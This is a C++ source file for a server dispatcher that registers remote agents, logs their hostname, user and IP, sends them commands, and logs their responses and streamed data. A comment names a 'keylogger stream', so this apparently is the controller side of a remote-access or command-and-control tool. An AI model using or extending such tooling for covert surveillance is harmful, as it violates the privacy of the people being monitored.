#include "server_dispatcher.hpp"

#include <iostream>
#include <sstream>
#include <stdexcept>

#include "codec/metrics_parser.hpp"
#include "codec/protocol_helper.hpp"
#include "codec/protocol_parser.hpp"
#include "codec/protocol_serializer.hpp"
#include "logger.hpp"
#include "socket/i_socket.hpp"
// ServerDispatcher::ServerDispatcher() {}
ServerDispatcher::ServerDispatcher() : Dispatcher() {}

void ServerDispatcher::handleFrame(FrameTransport& agent, const Frame& frame) {
  AgentConnection& connection = static_cast<AgentConnection&>(agent);
  switch (frame.header.type) {
    case MessageType::REGISTER:
      onRegister(connection, frame.payload);
      break;
    case MessageType::RESPONSE:
      onResponse(connection, frame.payload);
      break;
    case MessageType::DATA:
      onData(frame.payload);
      break;
    // case MessageType::DISCONNECT:
    //   running = false;
    //   break;
    case MessageType::ERROR:
      onError(frame.payload);
      break;
    default:
      sendError(agent, ErrorType::UNKNOWN_TYPE, "Unexpected message type");
  }
}

// ── Incoming handlers ────────────────────────────────────────

// The first message from the agent must always be REGISTER.
// Once we know who it is, we kick off the command sequence.
void ServerDispatcher::onRegister(AgentConnection& agent,
                                  const std::vector<std::uint8_t>& payload) {
  OsInfoPayload agentInfo = ProtocolParser::parseOsInfoPayload(payload);
  agent.setAgentInfo(agentInfo);

  std::ostringstream what;
  what << "[REGISTER] \nhostname : " << agentInfo.hostname
       << "\nuser : " << agentInfo.current_user
       << "\nos : " << static_cast<int>(agentInfo.os_type)
       << "\narch : " << static_cast<int>(agentInfo.arch)
       << "\nversion : " << agentInfo.os_version << "\nip : " << agentInfo.ip;
  Logger::info("server dispatcher", what.str());
}

// A RESPONSE carries the same id as the COMMAND it answers,
// plus chunk metadata for large payloads split across messages.
void ServerDispatcher::onResponse(AgentConnection& agent,
                                  const std::vector<std::uint8_t>& payload) {
  const ResponsePayload response =
      ProtocolParser::parseResponsePayload(payload);
  std::ostringstream what;

  what << "[RESPONSE] \nid=" << response.id
       << "  \nchunk=" << static_cast<int>(response.chunk_index) + 1 << "/"
       << static_cast<int>(response.total_chunks)
       << "  \nstatus=" << static_cast<int>(response.status) << "\n"
       << ProtocolParser::toString(response.data);

  Logger::info("server dispatcher", what.str());

  // Only act once all chunks of this response have arrived.
  const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
  // if (lastChunk) sendDisconnect(agent);
  // → To send more commands, push them here instead of disconnecting.
}

// DATA messages are pushed by the agent without a prior COMMAND
// (e.g. keylogger stream). Handle them independently of the
// request/response cycle.
void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
  const DataPayload data = ProtocolParser::parseDataPayload(payload);
  std::ostringstream what;
  what << "[DATA] subtype=" << static_cast<int>(data.subtype) << "\n";
  if (data.subtype == DataType::METRICS_SAMPLE) {
    MetricsSample sample = MetricsParser::parseMetricsSample(data.data);

    what << "[DATA] METRICS_SAMPLE\n";

    what << "CPU: " << sample.cpu.total_percent << "%\n";
    what << "CPU cores: ";
    for (float core : sample.cpu.per_core) what << core << "% ";
    what << '\n';

    what << "Memory: " << sample.mem.phys_used << "/" << sample.mem.phys_total
         << " bytes used\n";

    for (const auto& disk : sample.disks) {
      what << "Disk " << disk.device << " R=" << disk.read_bytes_per_sec
           << " W=" << disk.write_bytes_per_sec << '\n';
    }

    for (const auto& iface : sample.interfaces) {
      what << "Net " << iface.iface << " RX=" << iface.rx_bytes_per_sec
           << " TX=" << iface.tx_bytes_per_sec << '\n';
    }
  }
  Logger::info("server dispatcher", what.str());
  // std::cout << "[← DATA] subtype=" << static_cast<int>(data.subtype) << "\n"
  //           << data.data << "\n";
}

// ── Outgoing senders ─────────────────────────────────────────

void ServerDispatcher::sendCommand(AgentConnection& agent, CommandType type,
                                   const std::string& data) {
  CommandPayload command;
  command.id = nextId();
  command.type = type;
  command.data = data;
  const std::vector<std::uint8_t> payload =
      ProtocolSerializer::serializeCommandPayload(command);

  Frame frame = {ProtocolHelper::createHeader(MessageType::COMMAND, payload),
                 payload};
  // sendFrame(agent, frame);
  agent.sendFrame(frame);
  // sendRaw(agent, MessageType::COMMAND, payload);
  std::ostringstream what;
  what << "[COMMAND] id=" << command.id
       << "  type=" << static_cast<int>(command.type);
  Logger::info("server dispatcher", what.str());
  // std::cout << "[→ COMMAND] id=" << command.id
  //           << "  type=" << static_cast<int>(command.type) << "\n";
}

void ServerDispatcher::sendDisconnect(AgentConnection& agent) {
  const std::vector<uint8_t> payload{};
  Frame frame = {ProtocolHelper::createHeader(MessageType::DISCONNECT, payload),
                 payload};
  // sendRaw(agent, MessageType::DISCONNECT);
  // sendFrame(agent, frame);
  agent.sendFrame(frame);
  Logger::info("server dispatcher", "[DISCONNECT]");
  // std::cout << "[→ DISCONNECT]\n";
  //   running = false;
}

std::uint16_t ServerDispatcher::nextId() { return nextCmdId_++; }